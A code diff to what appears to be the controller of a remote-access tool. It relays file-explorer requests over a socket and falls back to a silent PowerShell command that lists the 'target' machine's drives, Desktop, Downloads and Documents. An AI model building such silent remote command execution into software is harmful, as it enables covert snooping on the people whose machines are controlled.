@@ -272,6 +272,7 @@ function App() {
   // --- Remote File Explorer & Target-to-Admin Downloader Engine ---
   const requestRemoteDirectory = (targetPath = '', includeDrives = false) => {
     setIsLoadingRemoteFiles(true);
+    const room = activeRoomIdRef.current || targetRoomId.trim();
     const req = {
       type: 'file-explorer-list-req',
       path: targetPath,
@@ -279,6 +280,9 @@ function App() {
       reqId: 'req_' + Date.now()
     };
     sendControlData(req);
+    if (socketRef.current && socketRef.current.connected) {
+      socketRef.current.emit('file-explorer-event', { roomId: room, payload: req });
+    }
 
     // Fallback for older host clients: if host doesn't respond in 1200ms, use silent PowerShell terminal query
     if (activeFallbackTimerRef.current) clearTimeout(activeFallbackTimerRef.current);
@@ -286,13 +290,17 @@ function App() {
       const escapedPath = targetPath ? targetPath.replace(/"/g, '\\"') : '';
       const psCmd = `$p = "${escapedPath}"; if (-not $p) { $p = [Environment]::GetFolderPath('Desktop') }; if (-not (Test-Path -LiteralPath $p)) { $p = 'C:\\' }; $entries = Get-ChildItem -LiteralPath $p -Force -ErrorAction SilentlyContinue | Select-Object Name, FullName, Length, LastWriteTime, @{Name='IsDirectory';Expression={$_.PSIsContainer}}; $parent = Split-Path -Path $p -Parent; $drives = [System.IO.DriveInfo]::GetDrives() | ForEach-Object { $_.Name }; $desk = [Environment]::GetFolderPath('Desktop'); $down = [IO.Path]::Combine($env:USERPROFILE, 'Downloads'); $docs = [Environment]::GetFolderPath('MyDocuments'); $out = @{ currentPath = $p; parentPath = $parent; drives = $drives; desktop = $desk; downloads = $down; documents = $docs; items = $entries }; $json = $out | ConvertTo-Json -Compress -Depth 3; Write-Output "---FE_LIST_JSON_START---$json---FE_LIST_JSON_END---"`;
 
-      sendControlData({
+      const cmdPayload = {
         type: 'terminal-command',
         id: 'fe_list_' + Date.now(),
         command: psCmd,
         shellType: 'powershell',
         isSilent: true
-      });
+      };
+      sendControlData(cmdPayload);
+      if (socketRef.current && socketRef.current.connected) {
+        socketRef.current.emit('terminal-command', cmdPayload);
+      }
     }, 1200);
   };
 
